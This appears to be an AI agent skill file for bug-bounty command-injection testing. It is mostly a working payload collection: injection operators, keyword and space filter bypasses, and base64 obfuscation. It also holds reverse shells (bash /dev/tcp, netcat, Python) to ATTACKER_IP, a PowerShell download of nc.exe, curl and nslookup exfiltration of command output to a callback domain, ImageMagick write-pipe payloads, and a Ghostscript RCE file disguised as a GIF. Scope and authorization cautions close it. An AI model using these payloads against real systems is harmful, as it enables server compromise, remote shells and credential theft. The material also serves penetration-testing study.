---
name: cmdi
description: Command Injection (all injection operators, blind time-based and OOB detection, all filter bypass techniques, encoding bypasses, Bashfuscator concept, API/web service CMDi). Use when HauntMode flags CMDi as APPLIES/MAYBE, when a parameter feeds a shell command, or when the app performs ping/traceroute/DNS/file operations.
---

# Command Injection (INDEX #07)

Covers all CMDi variants: direct output, blind time-based, OOB via DNS, and every known filter bypass from the CBBH notes. Read top-to-bottom on first invocation.

---

## 1. Triggers — when this skill applies

- Any parameter passed to a system command: ping, traceroute, nslookup, host, dig, curl, wget
- File operations where input affects a shell command: move, copy, compress, convert, upload processing
- "Export to PDF", "generate report", "convert image", "test connectivity" functionality
- Input used in command construction: hostname, IP address, port, filename, username
- API endpoints with path segments that are passed to `shell_exec()`, `system()`, `exec()`, `popen()`, `subprocess`
- `call_user_func_array()` in PHP where path segments become function names
- Any parameter labeled: `cmd`, `exec`, `command`, `shell`, `ping`, `host`, `server`, `url`, `path`
- Web service endpoints structured as `/api/function/argument1/argument2` (PHP path-info pattern)

---

---

## 3. 30-second triage

Try these in the suspect parameter (URL-encoded where needed). Watch for: command output in response, response delay, blank response where output was expected.

```
# Quick blind timing check
; sleep 5
| sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)
%0a sleep 5
%0asleep${IFS}5

# Quick output check (safe — lists current directory)
; ls
| id
&& whoami
```

If the response is delayed by ~5 seconds on the sleep payloads → blind CMDi confirmed. If you see command output → direct CMDi confirmed.

---

## 4. Detection — all injection operators

| Operator | Character | URL-Encoded | Behavior |
|---|---|---|---|
| Semicolon | `;` | `%3b` | Both commands execute |
| New Line | `\n` | `%0a` | Both commands execute |
| Background | `&` | `%26` | Both execute (second output shown first) |
| Pipe | `\|` | `%7c` | Both execute (only second output shown) |
| AND | `&&` | `%26%26` | Both execute (only if first succeeds) |
| OR | `\|\|` | `%7c%7c` | Second executes only if first fails |
| Sub-Shell | `` ` `` | `%60%60` | Both (Linux only) |
| Sub-Shell | `$()` | `%24%28%29` | Both (Linux only) |

**Note**: `&&` requires the preceding command to succeed. Use `||` or `\n` when the first command may fail. Use `||` with an empty/broken first arg: `|| whoami`.

### 4.1 Basic payload patterns

```
# Append to valid input (e.g. IP field with "127.0.0.1")
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami
127.0.0.1`whoami`
127.0.0.1$(whoami)

# No valid first arg (when field is empty or attacker-controlled)
; whoami
| whoami
|| whoami
`whoami`
$(whoami)

# Newline injection (often not blacklisted)
127.0.0.1%0awhoami
127.0.0.1%0a%09whoami    (newline + tab for space)
```

### 4.2 Windows-specific operators

```
127.0.0.1 & whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami
```

Note: `;` does NOT work in CMD. It works in PowerShell.

---

## 5. Confirmation — proving execution

### 5.1 Direct output

```bash
; id
; whoami
; uname -a
; ls -la
; cat /etc/passwd
```

### 5.2 Blind — time delay confirmation

Linux/MySQL (repeat 3x to rule out network jitter):
```
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
%0asleep${IFS}5
```

Windows:
```
& timeout /T 5 /NOBREAK
& ping -n 5 127.0.0.1
```

If delay is consistent on TRUE payload (`sleep 5`) and absent on control (`sleep 0`), blind CMDi is confirmed.

### 5.3 Blind — OOB DNS callback (via ezXSS)

OOB callback confirms RCE without output. Use `YOUR_EZXSS_DOMAIN` as the callback domain. Append an identifier to trace which injection point fired.

```bash
# Linux — DNS lookup as OOB callback
; nslookup cmdi-ping.YOUR_EZXSS_DOMAIN
; curl YOUR_EZXSS_DOMAIN/cmdi-fieldname
; wget YOUR_EZXSS_DOMAIN/cmdi-fieldname

# With data exfil in subdomain
; nslookup $(whoami).YOUR_EZXSS_DOMAIN
; curl "YOUR_EZXSS_DOMAIN/?output=$(id | base64)"
```

Blind via `ping` (if nslookup/curl are blocked):
```bash
; ping -c 1 cmdi-confirm.YOUR_EZXSS_DOMAIN
```

**Note**: No Burp Collaborator (Community Edition). Use ezXSS dashboard at `YOUR_EZXSS_DOMAIN` to check for callbacks.

---

## 6. Exploitation

### 6.1 OS identification

```bash
# Linux indicator
uname -a
cat /etc/os-release

# Windows indicator
systeminfo
ver
whoami /all
```

### 6.2 Privilege identification

```bash
# Linux
id
sudo -l
cat /etc/passwd
cat /etc/shadow   (root only)
ls -la /root/

# Windows
whoami /priv
net localgroup administrators
```

### 6.3 File system recon

```bash
# Linux
ls -la /
cat /etc/passwd
find / -name "*.txt" -type f 2>/dev/null
find / -name "flag*" 2>/dev/null
cat /var/www/html/config.php   (common config locations)

# Windows
dir C:\
type C:\Users\Administrator\Desktop\flag.txt
dir /s /b C:\flag.txt
```

### 6.4 Reverse shell

Start listener on attacker machine:
```bash
nc -lvnp 9000
```

Linux reverse shells:
```bash
# Bash
; bash -i >& /dev/tcp/ATTACKER_IP/9000 0>&1
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9000 0>&1'

# Netcat
; nc -e /bin/sh ATTACKER_IP 9000
; nc ATTACKER_IP 9000 -e /bin/bash

# Python
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

Windows via PowerShell (base64 encoded — avoids quote issues):
```bash
# Generate payload
python3 -c 'import base64; payload = "(new-object net.webclient).downloadfile(\"http://ATTACKER_IP/nc.exe\", \"c:\\\\windows\\\\tasks\\\\nc.exe\")"; print(base64.b64encode(payload.encode("utf-16-le")).decode())'

# Inject
& powershell -exec bypass -enc <BASE64_BLOB>
```

---

## 7. Bypass techniques

### 7.1 Bypassing operator blacklists — try newline first

Newline (`%0a`) is commonly not blacklisted because it may legitimately appear in input:
```
127.0.0.1%0awhoami
127.0.0.1%0a%09whoami    (with tab for space)
```

If `;` is blocked but `\n` is not:
```
127.0.0.1%0acat${IFS}/etc/passwd
```

### 7.2 Bypassing space filters

Linux — space alternatives:

| Method | Syntax | Notes |
|---|---|---|
| Tab | `%09` | Works everywhere |
| `$IFS` | `${IFS}` | Default value is space+tab; don't use inside `$()` |
| Brace expansion | `{cat,/etc/passwd}` | Commas become spaces |
| Redirect | `<` | `cat</etc/passwd` — no space needed |
| `$IFS` inline | `cat${IFS}/etc/passwd` | Most reliable |

Examples:
```bash
; cat${IFS}/etc/passwd
; cat%09/etc/passwd
; {cat,/etc/passwd}
; cat</etc/passwd
%0acat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

Windows — space alternatives:
```
%09                        (tab — CMD and PowerShell)
%PROGRAMFILES:~10,-5%      (CMD: expands to space)
$env:PROGRAMFILES[10]      (PowerShell: space)
```

### 7.3 Bypassing slash/backslash filters

Linux — get `/` without typing it:
```bash
${PATH:0:1}         # PATH starts with /
${HOME:0:1}         # HOME is usually /home/...
$(tr '!-}' '"-~'<<<.)   # character shift: . → /
```

Examples:
```bash
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
ls${IFS}${PATH:0:1}home
```

Windows — get `\` without typing it:
```
%HOMEPATH:~0,-17%       (CMD — expands to \)
$env:HOMEPATH[0]        (PowerShell — first char is \)
```

### 7.4 Bypassing semicolon filter

Get `;` from environment variable (Linux):
```bash
${LS_COLORS:10:1}   # gives ;
```

Character shifting:
```bash
echo $(tr '!-}' '"-~'<<<:)  # : is ASCII 58, shift gives ; (59)
```

Combined example:
```bash
127.0.0.1${LS_COLORS:10:1}${IFS}whoami
```

### 7.5 Bypassing blacklisted command keywords

#### Quote insertion (Linux and Windows — both types, even count)

```bash
w'h'o'am'i          # single quotes
w"h"o"am"i          # double quotes
who$@ami            # Linux: $@ expands to nothing
w\ho\am\i           # Linux: backslash ignored
who^ami             # Windows CMD: ^ ignored
```

#### Case manipulation (Linux — case-sensitive, needs transform)

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
```

Windows (CMD is case-insensitive — just alternate case):
```
WhoAmI
WHOAMI
```

#### Reversed commands (Linux)

```bash
# Test locally
echo 'whoami' | rev    # outputs: imaohw

# Inject
$(rev<<<'imaohw')
$(rev<<<'tac')</etc/passwd      # tac /etc/passwd reversed
```

Windows PowerShell reversed:
```powershell
iex "$('imaohw'[-1..-20] -join '')"
```

#### Base64 encoding (Linux — bypasses almost all keyword filters)

```bash
# Encode payload
echo -n 'cat /etc/passwd' | base64
# → Y2F0IC9ldGMvcGFzc3dk

# Inject
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
```

Windows PowerShell base64 (UTF-16LE encoding required):
```bash
# Generate
python3 -c 'import base64; print(base64.b64encode("whoami".encode("utf-16-le")).decode())'

# Inject
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

#### Hex encoding

```bash
echo -n 'cat /etc/passwd' | xxd -p
# Use: $(echo HEXVALUE | xxd -r -p | bash)
```

### 7.6 Character shifting (universal Linux technique)

Shifts each character by 1 in ASCII. Find the character before your target in `man ascii`, use it in the expression:

```bash
# \ is ASCII 92, [ is ASCII 91 (one before)
echo $(tr '!-}' '"-~'<<<[)    # outputs \

# ; is ASCII 59, : is ASCII 58
echo $(tr '!-}' '"-~'<<<:)    # outputs ;
```

### 7.7 Encoding bypasses for WAF evasion

```
URL encoding:   %3b = ;   %7c = |   %26 = &   %60 = `   %24%28%29 = $()
Double URL:     %253b = ;   %257c = |
```

### 7.8 Bashfuscator (concept — requires researcher to run)

Bashfuscator is a tool that automates command obfuscation. It generates payloads that bypass keyword filters, space filters, and character filters simultaneously:

```
[RUN THIS]
bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling
```

For maximum obfuscation (slower execution):
```
[RUN THIS]
bashfuscator -c 'cat /etc/passwd' --layers 3
```

The output is a heavily obfuscated bash command that avoids most filtered characters and keywords. Use when simpler bypasses fail.

### 7.9 API-specific: PHP path-info injection

PHP apps using `call_user_func_array()` with path segments as function arguments:

```
# Original: /api/ping/127.0.0.1
# If function name comes from path: /api/system/id
GET /api/ping-server.php/system/id

# List directory
GET /api/ping-server.php/system/ls
```

### 7.10 Git flag injection via user-controlled `ref` parameter

When a search or blob API passes a user-supplied `ref` parameter directly to `git grep` without sanitization, setting `ref=--no-index` causes git to search the working directory (including files not tracked by git) rather than a specific commit. This can expose internal config files:

```
# Vulnerable API call pattern
GET /api/v4/projects/ID/search?scope=blobs&search=.&ref=--no-index

# git receives:
git --git-dir /path/to/repo.git grep ... -e . --no-index
# → searches current working directory including config.toml, env files
```

**What it exposes:** Internal config files adjacent to git repos — API tokens, Gitaly tokens, Sentry DSNs, database credentials in `config.toml` or similar.

**Broadly applicable:** Any API that runs `git grep $ref` or `git show $ref:path` where `$ref` is user-supplied. Test with `--no-index` (read working dir), `-C /` (change working dir to root), `--open-files-in-pager` (trigger pager execution).

### 7.11 ImageMagick command injection via image processing parameters

When a web app's image resize/transform endpoint passes user-controlled parameters to ImageMagick (directly or via an image processing library), ImageMagick's `-write` argument accepts a pipe syntax that executes an arbitrary OS command. If user-supplied transformation options reach ImageMagick without sanitization, this achieves RCE.

**Detection:** Look for endpoints that accept image transformation parameters — `resize`, `crop`, `quality`, `format`, `combine_options`, or similar — especially in apps using Rails Active Storage/MiniMagick, PHP Imagick, or any ImageMagick wrapper.

**Payloads:**
```bash
# Via combine_options (Rails/MiniMagick pattern)
# Append to image variant URL or POST body
?combine_options[write]=| id > /tmp/pwned
?combine_options[write]=| curl http://ATTACKER_IP/$(id)

# Via direct write argument injection
?operations[][name]=write&operations[][value]=|id > /tmp/pwned

# Test for write handler execution (blind — check OOB)
?combine_options[write]=| curl http://ATTACKER_EZXSS_DOMAIN/imgmagick
```

**Confirm execution:**
```bash
# If app reflects image output, use ImageMagick to write data into the image metadata
?combine_options[comment]=INJECTED_MARKER

# Blind — check /tmp for file creation (if you have LFI or error disclosure)
?combine_options[write]=/tmp/pwned.txt

# OOB DNS via curl
?combine_options[write]=| curl http://YOUR_EZXSS_DOMAIN/imgcmd
```

**Broadly applicable to:** Any app using ImageMagick for image processing that forwards user-supplied transformation keys/values to the library. Not limited to Rails — also applies to PHP Imagick with `setOption()`, Python Wand, and any framework that builds an ImageMagick command string from request parameters.

### 7.12 PostScript/Ghostscript RCE via disguised image upload

When an app uses ImageMagick for server-side image processing and does not validate actual file content (only the extension), uploading a PostScript or EPS file disguised as an image (`.gif`, `.jpeg`, `.png`) causes ImageMagick to detect the `%!PS` magic bytes and delegate processing to the Ghostscript interpreter. Ghostscript executes arbitrary PostScript commands, enabling RCE.

**Detection:** Any image upload endpoint using ImageMagick without content-type validation. Look for apps that process uploaded avatars, profile images, cover photos, or design assets.

**Payload (upload as `exploit.gif` or `exploit.jpeg`):**
```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%curl http://YOUR_EZXSS_DOMAIN/ghostscript-rce) currentdevice putdeviceprops
```

**With reverse shell:**
```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1) currentdevice putdeviceprops
```

**Steps:**
1. Create a file starting with `%!PS` (PostScript magic bytes)
2. Save with a valid image extension (`.gif` is most reliable — ImageMagick historically trusted extension for GIF but reads magic bytes)
3. Upload to any image processing endpoint
4. If the server processes it, the Ghostscript interpreter executes the `%pipe%` command

**Broadly applicable to:** Any server using ImageMagick/GraphicsMagick without restricting Ghostscript delegation. Not version-specific — Ghostscript has had multiple exploitable vulnerabilities in this delegation path (CVE-2017-8291, ImageTragick family).

---

## 8. False-positive checks

- **Sleep delay not reproducible**: retry at least 3 times; network jitter can cause false delays. A real time-based CMDi is consistently delayed. Use `sleep 5` not `sleep 1`.
- **Input sanitized after reaching shell**: `escapeshellarg()` in PHP wraps input in single quotes and escapes existing single quotes. If this is applied, the standard `; whoami` will not work — check for quote escape bypass or test for errors.
- **Command output in an unrelated context**: the app may show system info in its error messages (e.g. server version) without being injectable. Confirm by changing your payload to a unique string and checking if that string appears in output.
- **Semicolons valid in the field**: some fields (file paths on Windows, CSS, query strings) legitimately contain `;`. A semicolon not causing an error is not confirmation of injection.
- **Newline in query string**: some frameworks normalize `%0a` to a newline within a parameter value but never pass it to shell. Confirm with a timing test rather than assuming output.
- **Blind confirmation requires 3+ consistent timing tests**: a single slow response is not enough. Run the `sleep` payload 3 times and the baseline 3 times.

---

## 9. Chain candidates

| Chain | Other skill | Impact |
|---|---|---|
| CMDi → read source code → find hardcoded creds | `auth-bypass` | Credential theft |
| CMDi → read `/etc/passwd` and `/etc/shadow` → crack | `auth-bypass` | OS-level credential theft |
| CMDi → write webshell → persistent RCE | Direct finding | Full server compromise |
| CMDi → SSRF pivot to internal services | `ssrf` | Internal network access |
| CMDi in PDF generator / image converter | `ssrf`, `lfi` | Server-side execution |
| Blind CMDi → OOB via DNS → confirm → escalate | Direct finding | Confirms RCE for report |
| CMDi via file upload (filename injected into shell) | `file-upload` | Chained upload + RCE |
| CMDi in API path segment (`/api/func/arg`) | `api-attacks` | API-specific RCE |
| Stored CMDi (admin runs report including your input) | `xss` (similar delivery) | Delayed RCE |

---

## 10. Reporting template

```
POTENTIAL FINDING: Command Injection — <Direct Output / Blind Time-Based / Blind OOB>
Target: <full URL>
Parameter: <name + location: query/body/header/path>
OS: <Linux | Windows>
Evidence:
    Direct: <command output excerpt>
    Time-based: <3 timing measurements with sleep vs baseline>
    OOB: <DNS callback from YOUR_EZXSS_DOMAIN — timestamp and subdomain>
Working payload:
    <exact payload (URL-decoded for readability, URL-encoded version also noted)>
Confirmed output (minimal PoC):
    <e.g. id output: uid=33(www-data) gid=33(www-data)>
Impact:
    <e.g. Unauthenticated RCE as www-data on production web server>
Filter bypasses required: <none | space via ${IFS} | keyword via quote insertion | base64 encoding>
Next step: <escalate to reverse shell / read sensitive files / chain to privesc>
```

---

## 11. Recon tracker vector strings

Only log if user explicitly instructs.

- `cmdi:direct:<param>` — confirmed direct output CMDi
- `cmdi:blind-time:<param>` — confirmed time-based blind CMDi
- `cmdi:blind-oob:<param>` — confirmed OOB DNS callback CMDi
- `cmdi:filter-bypass:<technique>` — bypass technique required
- `cmdi:rce:shell` — escalated to reverse shell
- `cmdi:no:<param>` — confirmed not injectable (escapeshellarg / parameterized)

---

## 12. What NOT to do

- **Do not run destructive commands** (`rm`, `mkfs`, `format`, `shutdown`, `reboot`) on production systems. Ever. Use `id`, `whoami`, `uname -a` as PoC.
- **Do not initiate reverse shells on production** without explicit written program authorization. Some programs explicitly forbid establishing persistent access or outbound connections.
- **Do not use `curl`/`wget` to download and execute binaries from your server** during initial PoC — confirm with `id` first, then escalate only if the program scope allows it.
- **Do not use Bashfuscator without the researcher running it** — it's a heavy tool that generates many requests. Give the command as a [RUN THIS] block.
- **Do not assume Linux** — check the server headers, error messages, and path separators before crafting payloads. Windows CMDi requires different operators and syntax.
- **Do not skip the 3-test verification** on time-based blind CMDi. A single slow response is not a confirmed finding.
- **Do not report "front-end validation bypass" as CMDi** if the back-end also validates/sanitizes — confirm the payload reaches and executes in the shell context.
- **Do not auto-log to the recon tracker** without explicit user instruction.
- **Do not test out-of-scope domains.** Re-read `scope.txt` before any OOB callback probe.
